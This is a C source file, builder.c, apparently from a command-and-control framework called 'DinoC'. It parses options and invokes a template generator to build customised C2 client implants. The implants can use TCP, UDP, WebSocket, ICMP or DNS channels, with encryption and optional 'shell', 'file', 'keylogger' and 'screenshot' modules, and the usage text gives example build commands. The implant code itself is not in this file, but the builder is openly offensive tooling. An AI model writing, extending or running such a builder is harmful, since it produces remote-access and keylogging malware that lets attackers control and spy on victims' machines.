/**
 * @file builder.c
 * @brief Builder tool implementation for generating customized C2 clients
 */

#include "builder.h"
#include "template_generator.h"
#include "../include/common.h"
#include "../include/protocol.h"
#include "../encryption/encryption.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <getopt.h>

// Default values
#define DEFAULT_OUTPUT_FILE "client"
#define DEFAULT_VERSION_MAJOR 1
#define DEFAULT_VERSION_MINOR 0
#define DEFAULT_VERSION_PATCH 0
#define DEFAULT_ENCRYPTION_ALGORITHM ENCRYPTION_AES_256_GCM

// Builder version
#define BUILDER_VERSION_MAJOR 1
#define BUILDER_VERSION_MINOR 0
#define BUILDER_VERSION_PATCH 0

// Helper functions
static status_t parse_protocols(const char* protocols_str, protocol_type_t** protocols, size_t* count);
static status_t parse_servers(const char* servers_str, char*** servers, size_t* count);
static status_t parse_modules(const char* modules_str, char*** modules, size_t* count);
static status_t parse_encryption(const char* encryption_str, encryption_algorithm_t* algorithm);
static void print_usage(const char* program_name);

/**
 * @brief Initialize builder
 */
status_t builder_init(void) {
    // Nothing to initialize for now
    return STATUS_SUCCESS;
}

/**
 * @brief Shutdown builder
 */
status_t builder_shutdown(void) {
    // Nothing to clean up for now
    return STATUS_SUCCESS;
}

/**
 * @brief Parse command line arguments
 */
status_t builder_parse_args(int argc, char** argv, builder_config_t* config) {
    if (config == NULL) {
        return STATUS_ERROR_INVALID_PARAM;
    }
    
    // Initialize config with default values
    memset(config, 0, sizeof(builder_config_t));
    config->encryption_algorithm = DEFAULT_ENCRYPTION_ALGORITHM;
    config->output_file = strdup(DEFAULT_OUTPUT_FILE);
    config->version_major = DEFAULT_VERSION_MAJOR;
    config->version_minor = DEFAULT_VERSION_MINOR;
    config->version_patch = DEFAULT_VERSION_PATCH;
    
    if (config->output_file == NULL) {
        return STATUS_ERROR_MEMORY;
    }
    
    // Define long options
    static struct option long_options[] = {
        {"protocol", required_argument, 0, 'p'},
        {"servers", required_argument, 0, 's'},
        {"domain", required_argument, 0, 'd'},
        {"modules", required_argument, 0, 'm'},
        {"encryption", required_argument, 0, 'e'},
        {"output", required_argument, 0, 'o'},
        {"debug", no_argument, 0, 'g'},
        {"version", required_argument, 0, 'v'},
        {"help", no_argument, 0, 'h'},
        {"version-info", no_argument, 0, 'i'},
        {0, 0, 0, 0}
    };
    
    // Parse options
    int opt;
    int option_index = 0;
    
    while ((opt = getopt_long(argc, argv, "p:s:d:m:e:o:gv:hi", long_options, &option_index)) != -1) {
        switch (opt) {
            case 'p':
                if (parse_protocols(optarg, &config->protocols, &config->protocol_count) != STATUS_SUCCESS) {
                    fprintf(stderr, "Error: Invalid protocol list\n");
                    builder_clean_config(config);
                    return STATUS_ERROR_INVALID_PARAM;
                }
                break;
                
            case 's':
                if (parse_servers(optarg, &config->servers, &config->server_count) != STATUS_SUCCESS) {
                    fprintf(stderr, "Error: Invalid server list\n");
                    builder_clean_config(config);
                    return STATUS_ERROR_INVALID_PARAM;
                }
                break;
                
            case 'd':
                config->domain = strdup(optarg);
                if (config->domain == NULL) {
                    builder_clean_config(config);
                    return STATUS_ERROR_MEMORY;
                }
                break;
                
            case 'm':
                if (parse_modules(optarg, &config->modules, &config->module_count) != STATUS_SUCCESS) {
                    fprintf(stderr, "Error: Invalid module list\n");
                    builder_clean_config(config);
                    return STATUS_ERROR_INVALID_PARAM;
                }
                break;
                
            case 'e':
                if (parse_encryption(optarg, &config->encryption_algorithm) != STATUS_SUCCESS) {
                    fprintf(stderr, "Error: Invalid encryption algorithm\n");
                    builder_clean_config(config);
                    return STATUS_ERROR_INVALID_PARAM;
                }
                break;
                
            case 'o':
                free(config->output_file);
                config->output_file = strdup(optarg);
                if (config->output_file == NULL) {
                    builder_clean_config(config);
                    return STATUS_ERROR_MEMORY;
                }
                break;
                
            case 'g':
                config->debug_mode = true;
                break;
                
            case 'v': {
                // Parse version string (format: major.minor.patch)
                int major, minor, patch;
                if (sscanf(optarg, "%d.%d.%d", &major, &minor, &patch) != 3) {
                    fprintf(stderr, "Error: Invalid version format (expected major.minor.patch)\n");
                    builder_clean_config(config);
                    return STATUS_ERROR_INVALID_PARAM;
                }
                
                if (major < 0 || minor < 0 || patch < 0) {
                    fprintf(stderr, "Error: Version numbers cannot be negative\n");
                    builder_clean_config(config);
                    return STATUS_ERROR_INVALID_PARAM;
                }
                
                config->version_major = (uint16_t)major;
                config->version_minor = (uint16_t)minor;
                config->version_patch = (uint16_t)patch;
                break;
            }
                
            case 'h':
                print_usage(argv[0]);
                builder_clean_config(config);
                return STATUS_ERROR_INVALID_PARAM;  // Not really an error, but we want to exit
                
            case 'i':
                printf("DinoC Builder Tool v%d.%d.%d\n", 
                       BUILDER_VERSION_MAJOR, BUILDER_VERSION_MINOR, BUILDER_VERSION_PATCH);
                builder_clean_config(config);
                return STATUS_ERROR_INVALID_PARAM;  // Not really an error, but we want to exit
                
            default:
                fprintf(stderr, "Error: Unknown option\n");
                print_usage(argv[0]);
                builder_clean_config(config);
                return STATUS_ERROR_INVALID_PARAM;
        }
    }
    
    // Validate required parameters
    if (config->protocol_count == 0) {
        fprintf(stderr, "Error: No protocols specified\n");
        builder_clean_config(config);
        return STATUS_ERROR_INVALID_PARAM;
    }
    
    if (config->server_count == 0) {
        fprintf(stderr, "Error: No servers specified\n");
        builder_clean_config(config);
        return STATUS_ERROR_INVALID_PARAM;
    }
    
    // Check if DNS protocol is used but no domain is specified
    bool has_dns = false;
    for (size_t i = 0; i < config->protocol_count; i++) {
        if (config->protocols[i] == PROTOCOL_TYPE_DNS) {
            has_dns = true;
            break;
        }
    }
    
    if (has_dns && config->domain == NULL) {
        fprintf(stderr, "Error: DNS protocol requires a domain\n");
        builder_clean_config(config);
        return STATUS_ERROR_INVALID_PARAM;
    }
    
    return STATUS_SUCCESS;
}

/**
 * @brief Build client with the given configuration
 */
status_t builder_build_client(const builder_config_t* config) {
    if (config == NULL) {
        return STATUS_ERROR_INVALID_PARAM;
    }
    
    // Print build information
    printf("Building client with the following configuration:\n");
    printf("Protocols: ");
    for (size_t i = 0; i < config->protocol_count; i++) {
        switch (config->protocols[i]) {
            case PROTOCOL_TYPE_TCP:
                printf("TCP");
                break;
            case PROTOCOL_TYPE_UDP:
                printf("UDP");
                break;
            case PROTOCOL_TYPE_WS:
                printf("WebSocket");
                break;
            case PROTOCOL_TYPE_ICMP:
                printf("ICMP");
                break;
            case PROTOCOL_TYPE_DNS:
                printf("DNS");
                break;
            default:
                printf("Unknown");
                break;
        }
        
        if (i < config->protocol_count - 1) {
            printf(", ");
        }
    }
    printf("\n");
    
    printf("Servers: ");
    for (size_t i = 0; i < config->server_count; i++) {
        printf("%s", config->servers[i]);
        
        if (i < config->server_count - 1) {
            printf(", ");
        }
    }
    printf("\n");
    
    if (config->domain != NULL) {
        printf("Domain: %s\n", config->domain);
    }
    
    printf("Modules: ");
    if (config->module_count > 0) {
        for (size_t i = 0; i < config->module_count; i++) {
            printf("%s", config->modules[i]);
            
            if (i < config->module_count - 1) {
                printf(", ");
            }
        }
    } else {
        printf("None");
    }
    printf("\n");
    
    printf("Encryption: ");
    switch (config->encryption_algorithm) {
        case ENCRYPTION_NONE:
            printf("None");
            break;
        case ENCRYPTION_AES_128_GCM:
            printf("AES-128-GCM");
            break;
        case ENCRYPTION_AES_256_GCM:
            printf("AES-256-GCM");
            break;
        case ENCRYPTION_CHACHA20_POLY1305:
            printf("ChaCha20-Poly1305");
            break;
        default:
            printf("Unknown");
            break;
    }
    printf("\n");
    
    printf("Output: %s\n", config->output_file);
    printf("Debug mode: %s\n", config->debug_mode ? "Yes" : "No");
    printf("Version: %u.%u.%u\n", config->version_major, config->version_minor, config->version_patch);
    
    // Initialize template generator
    status_t status = template_generator_init();
    if (status != STATUS_SUCCESS) {
        fprintf(stderr, "Error: Failed to initialize template generator\n");
        return status;
    }
    
    // Generate client from template
    status = template_generator_generate(config, config->output_file);
    
    if (status != STATUS_SUCCESS) {
        fprintf(stderr, "Error: Failed to generate client\n");
        template_generator_shutdown();
        return status;
    }
    
    // Shutdown template generator
    template_generator_shutdown();
    
    printf("\nClient built successfully: %s\n", config->output_file);
    
    return STATUS_SUCCESS;
}

/**
 * @brief Clean up builder configuration
 */
status_t builder_clean_config(builder_config_t* config) {
    if (config == NULL) {
        return STATUS_ERROR_INVALID_PARAM;
    }
    
    // Free protocols
    if (config->protocols != NULL) {
        free(config->protocols);
        config->protocols = NULL;
    }
    
    // Free servers
    if (config->servers != NULL) {
        for (size_t i = 0; i < config->server_count; i++) {
            free(config->servers[i]);
        }
        
        free(config->servers);
        config->servers = NULL;
    }
    
    // Free domain
    if (config->domain != NULL) {
        free(config->domain);
        config->domain = NULL;
    }
    
    // Free modules
    if (config->modules != NULL) {
        for (size_t i = 0; i < config->module_count; i++) {
            free(config->modules[i]);
        }
        
        free(config->modules);
        config->modules = NULL;
    }
    
    // Free output file
    if (config->output_file != NULL) {
        free(config->output_file);
        config->output_file = NULL;
    }
    
    return STATUS_SUCCESS;
}

/**
 * @brief Parse protocols string
 */
static status_t parse_protocols(const char* protocols_str, protocol_type_t** protocols, size_t* count) {
    if (protocols_str == NULL || protocols == NULL || count == NULL) {
        return STATUS_ERROR_INVALID_PARAM;
    }
    
    // Count number of protocols
    size_t protocol_count = 1;
    for (const char* p = protocols_str; *p != '\0'; p++) {
        if (*p == ',') {
            protocol_count++;
        }
    }
    
    // Allocate memory for protocols
    protocol_type_t* protocol_array = (protocol_type_t*)malloc(protocol_count * sizeof(protocol_type_t));
    if (protocol_array == NULL) {
        return STATUS_ERROR_MEMORY;
    }
    
    // Parse protocols
    size_t index = 0;
    const char* start = protocols_str;
    
    for (const char* p = protocols_str; ; p++) {
        if (*p == ',' || *p == '\0') {
            // Extract protocol name
            size_t len = p - start;
            char* protocol_name = (char*)malloc(len + 1);
            
            if (protocol_name == NULL) {
                free(protocol_array);
                return STATUS_ERROR_MEMORY;
            }
            
            strncpy(protocol_name, start, len);
            protocol_name[len] = '\0';
            
            // Convert protocol name to type
            if (strcmp(protocol_name, "tcp") == 0) {
                protocol_array[index] = PROTOCOL_TYPE_TCP;
            } else if (strcmp(protocol_name, "udp") == 0) {
                protocol_array[index] = PROTOCOL_TYPE_UDP;
            } else if (strcmp(protocol_name, "ws") == 0) {
                protocol_array[index] = PROTOCOL_TYPE_WS;
            } else if (strcmp(protocol_name, "icmp") == 0) {
                protocol_array[index] = PROTOCOL_TYPE_ICMP;
            } else if (strcmp(protocol_name, "dns") == 0) {
                protocol_array[index] = PROTOCOL_TYPE_DNS;
            } else {
                fprintf(stderr, "Error: Unknown protocol '%s'\n", protocol_name);
                free(protocol_name);
                free(protocol_array);
                return STATUS_ERROR_INVALID_PARAM;
            }
            
            free(protocol_name);
            index++;
            
            if (*p == '\0') {
                break;
            }
            
            start = p + 1;
        }
    }
    
    *protocols = protocol_array;
    *count = protocol_count;
    
    return STATUS_SUCCESS;
}

/**
 * @brief Parse servers string
 */
static status_t parse_servers(const char* servers_str, char*** servers, size_t* count) {
    if (servers_str == NULL || servers == NULL || count == NULL) {
        return STATUS_ERROR_INVALID_PARAM;
    }
    
    // Count number of servers
    size_t server_count = 1;
    for (const char* p = servers_str; *p != '\0'; p++) {
        if (*p == ',') {
            server_count++;
        }
    }
    
    // Allocate memory for servers
    char** server_array = (char**)malloc(server_count * sizeof(char*));
    if (server_array == NULL) {
        return STATUS_ERROR_MEMORY;
    }
    
    // Parse servers
    size_t index = 0;
    const char* start = servers_str;
    
    for (const char* p = servers_str; ; p++) {
        if (*p == ',' || *p == '\0') {
            // Extract server address
            size_t len = p - start;
            char* server = (char*)malloc(len + 1);
            
            if (server == NULL) {
                for (size_t i = 0; i < index; i++) {
                    free(server_array[i]);
                }
                
                free(server_array);
                return STATUS_ERROR_MEMORY;
            }
            
            strncpy(server, start, len);
            server[len] = '\0';
            
            // Validate server address (simple check for now)
            if (strchr(server, ':') == NULL) {
                fprintf(stderr, "Error: Invalid server address '%s' (expected host:port)\n", server);
                
                free(server);
                for (size_t i = 0; i < index; i++) {
                    free(server_array[i]);
                }
                
                free(server_array);
                return STATUS_ERROR_INVALID_PARAM;
            }
            
            server_array[index] = server;
            index++;
            
            if (*p == '\0') {
                break;
            }
            
            start = p + 1;
        }
    }
    
    *servers = server_array;
    *count = server_count;
    
    return STATUS_SUCCESS;
}

/**
 * @brief Parse modules string
 */
static status_t parse_modules(const char* modules_str, char*** modules, size_t* count) {
    if (modules_str == NULL || modules == NULL || count == NULL) {
        return STATUS_ERROR_INVALID_PARAM;
    }
    
    // Count number of modules
    size_t module_count = 1;
    for (const char* p = modules_str; *p != '\0'; p++) {
        if (*p == ',') {
            module_count++;
        }
    }
    
    // Allocate memory for modules
    char** module_array = (char**)malloc(module_count * sizeof(char*));
    if (module_array == NULL) {
        return STATUS_ERROR_MEMORY;
    }
    
    // Parse modules
    size_t index = 0;
    const char* start = modules_str;
    
    for (const char* p = modules_str; ; p++) {
        if (*p == ',' || *p == '\0') {
            // Extract module name
            size_t len = p - start;
            char* module = (char*)malloc(len + 1);
            
            if (module == NULL) {
                for (size_t i = 0; i < index; i++) {
                    free(module_array[i]);
                }
                
                free(module_array);
                return STATUS_ERROR_MEMORY;
            }
            
            strncpy(module, start, len);
            module[len] = '\0';
            
            // Validate module name
            if (strcmp(module, "shell") != 0 && 
                strcmp(module, "file") != 0 && 
                strcmp(module, "keylogger") != 0 && 
                strcmp(module, "screenshot") != 0) {
                fprintf(stderr, "Warning: Unknown module '%s', it may not be supported\n", module);
                // We don't return an error here, just a warning
            }
            
            module_array[index] = module;
            index++;
            
            if (*p == '\0') {
                break;
            }
            
            start = p + 1;
        }
    }
    
    *modules = module_array;
    *count = module_count;
    
    return STATUS_SUCCESS;
}

/**
 * @brief Parse encryption string
 */
static status_t parse_encryption(const char* encryption_str, encryption_algorithm_t* algorithm) {
    if (encryption_str == NULL || algorithm == NULL) {
        return STATUS_ERROR_INVALID_PARAM;
    }
    
    if (strcmp(encryption_str, "none") == 0) {
        *algorithm = ENCRYPTION_NONE;
    } else if (strcmp(encryption_str, "aes128") == 0) {
        *algorithm = ENCRYPTION_AES_128_GCM;
    } else if (strcmp(encryption_str, "aes256") == 0) {
        *algorithm = ENCRYPTION_AES_256_GCM;
    } else if (strcmp(encryption_str, "chacha20") == 0) {
        *algorithm = ENCRYPTION_CHACHA20_POLY1305;
    } else {
        return STATUS_ERROR_INVALID_PARAM;
    }
    
    return STATUS_SUCCESS;
}

/**
 * @brief Print usage information
 */
static void print_usage(const char* program_name) {
    printf("DinoC Builder Tool v1.0.0\n");
    printf("A tool for generating customized C2 clients\n\n");
    printf("Usage: %s [options]\n", program_name);
    printf("Options:\n");
    printf("  -p, --protocol=PROTOCOLS   Comma-separated list of protocols (tcp,udp,ws,icmp,dns)\n");
    printf("                             Required. At least one protocol must be specified.\n");
    printf("  -s, --servers=SERVERS      Comma-separated list of servers (host:port)\n");
    printf("                             Required. At least one server must be specified.\n");
    printf("  -d, --domain=DOMAIN        Domain for DNS protocol\n");
    printf("                             Required if DNS protocol is specified.\n");
    printf("  -m, --modules=MODULES      Comma-separated list of modules\n");
    printf("                             Optional. Available modules: shell, file, keylogger, screenshot\n");
    printf("  -e, --encryption=ENC       Encryption algorithm (none,aes128,aes256,chacha20)\n");
    printf("                             Optional. Default: aes256\n");
    printf("  -o, --output=FILE          Output file name\n");
    printf("                             Optional. Default: client\n");
    printf("  -g, --debug                Enable debug mode\n");
    printf("                             Optional. Default: disabled\n");
    printf("  -v, --version=VERSION      Version number (major.minor.patch)\n");
    printf("                             Optional. Default: 1.0.0\n");
    printf("  -h, --help                 Display this help message\n");
    printf("\n");
    printf("Examples:\n");
    printf("  %s -p tcp,dns -s 127.0.0.1:8080,127.0.0.1:53 -d test.com -m shell\n", program_name);
    printf("  %s -p tcp -s 192.168.1.10:8080 -e aes256 -o custom_client -g\n", program_name);
    printf("  %s -p tcp,udp,dns -s 10.0.0.1:8080,10.0.0.1:53 -d example.com -m shell,file -v 1.2.3\n", program_name);
}
